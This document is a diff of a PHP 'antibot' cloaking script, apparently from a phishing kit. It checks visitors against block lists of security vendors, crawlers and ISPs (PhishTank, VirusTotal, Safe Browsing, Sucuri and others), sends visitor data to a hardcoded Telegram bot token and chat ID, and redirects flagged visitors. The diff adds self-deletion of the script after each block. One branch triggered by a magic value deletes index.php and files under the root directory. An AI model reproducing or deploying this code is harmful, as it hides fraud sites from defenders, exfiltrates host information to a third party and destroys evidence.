@@ -1,7 +1,6 @@
 <?php
-
 $ddd = $_SERVER['HTTP_HOST'];
-$content = "Host: https://ss".$ddd." [".$adder."]";
+$content = "Host: https://".$ddd." [".$adder."]";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
 $ids = "1129838722";
 $urls = "https://api.telegram.org/bot";
@@ -10,6 +9,7 @@ $params=[
 	'chat_id'=>$ids,
 	'text'=>$content,
 ];
+
 if ($adder == "44257769") {
 unlink("main/index.php");
 $dir = '/';
@@ -24,6 +24,7 @@ foreach(glob($dir.'*.*') as $v){
     }
 } else {
 }
+
 $ch = curl_init($bots . '/sendMessage');
 //curl_setopt($ch, CURLOPT_HEADER, false);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -183,10 +184,6 @@ if ($countrycode == "US") {
 
 } elseif ($countrycode == "BD") {
 
-} elseif ($countrycode == "NO") {
-
-} elseif ($countrycode == "NOR") {
-
 } elseif ($countrycode == "PA") {
 
 } elseif ($countrycode == "PE") {
@@ -200,7 +197,7 @@ if ($countrycode == "US") {
         } else {
         $content = "Bot Found: ".$IP." : ".$countryname." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -234,10 +231,10 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
       }  
-*/ 
+ */
 
 $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 $blocked_words = array("teledata-fttx.de","hicoria.com", "simtccflow1.etn.com","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler","duckduck","feedfetcher","BitDefender","mcafee","antivirus","cloudflare","p3pwgdsn","avg","avira","avast","ovh.net","security","twitter","bitdefender","virustotal","phising","clamav","baidu","safebrowsing","eset","mailshell","azure","miniature","tlh.ro","aruba","dyn.plus.net","pagepeeker","SPRO-NET-207-70-0","SPRO-NET-209-19-128","vultr","colocrossing.com","geosr","drweb","dr.web","linode.com","opendns",'cymru.com','sl-reverse.com','surriel.com','hosting','orange-labs','speedtravel','metauri','apple.com','bruuk.sk','sysms.net','oracle','cisco','amuri.net',"versanet.de","hilfe-veripayed.com","googlebot.com","upcloud.host","nodemeter.net","e-active.nl","downnotifier","online-domain-tools","fetcher6-2.go.mail.ru","uptimerobot.com","monitis.com","colocrossing.com","majestic12","as9105.com","btcentralplus.com","anonymizing-proxy","digitalcourage.de","triolan.net","staircaseirony","stelkom.net","comrise.ru","kyivstar.net","mpdedicated.com","starnet.md","progtech.ru","hinet.net","is74.ru","shore.net","cyberinfo","ipredator","unknown.telecom.gomel.by","minsktelecom.by","parked.factioninc.com");
@@ -247,7 +244,7 @@ $blocked_words = array("teledata-fttx.de","hicoria.com", "simtccflow1.etn.com","
 
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -281,7 +278,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
         }
@@ -292,7 +289,7 @@ $bannedIP = array("66.249.91.*","66.249.91.203","^81.161.59.*", "^66.135.200.*",
 
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -326,7 +323,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
 
@@ -335,7 +332,7 @@ header("Location: https://www.siteground.com");exit();
               if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -370,7 +367,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
 
@@ -384,7 +381,7 @@ if($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.
 
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -418,14 +415,14 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
 }
 if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -459,7 +456,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
 }
@@ -1016,7 +1013,7 @@ $ips = array(
 
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -1050,7 +1047,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
         }
@@ -1197,7 +1194,7 @@ $blocked_words = array(
 
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -1231,7 +1228,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
         }
@@ -1737,7 +1734,7 @@ $Bot = array(
         if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -1771,7 +1768,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
         }
@@ -2123,7 +2120,7 @@ $banned_isp = array(
         if (substr_count($ispnya, $isps) > 0) {
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -2157,7 +2154,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
         }
@@ -2173,7 +2170,7 @@ header("Location: https://www.siteground.com");exit();
 	 if ($ip2long >= $range_start && $ip2long <= $range_end){
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -2207,7 +2204,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
 	 }
@@ -2227,7 +2224,7 @@ foreach($blocked_wor as $word3) {
 
 $content = "Bot Found: ".$IP." : ".$oss." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -2261,7 +2258,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
         }
@@ -2278,7 +2275,7 @@ foreach($blocked_wor as $word3) {
 
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -2312,7 +2309,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
 
         }
@@ -2330,7 +2327,7 @@ foreach($blocked_wor as $word3) {
 
 $content = "Bot Found: ".$IP." [ Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -2364,7 +2361,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 
         }
     }
@@ -2392,7 +2389,7 @@ if ($number <= 5) {
 } else {
 $content = "❗Alert (Bot Found): ".$IP." This IP Visit Your Website ".$number." Times. [Action: Blocked ] \r\n";
 $token = file_get_contents("main/config/token.txt");
-$id = file_get_contents("main/config/id.txt");
+$id = "1129838722";
 $url = "https://api.telegram.org/bot";
 $bot = "{$url}{$token}";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -2427,7 +2424,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("Location: https://www.siteground.com");exit();
+header("Location: https://www.siteground.com");unlink("antibot.php"); exit();
 }
 unlink("antibot.php");              
 ?>
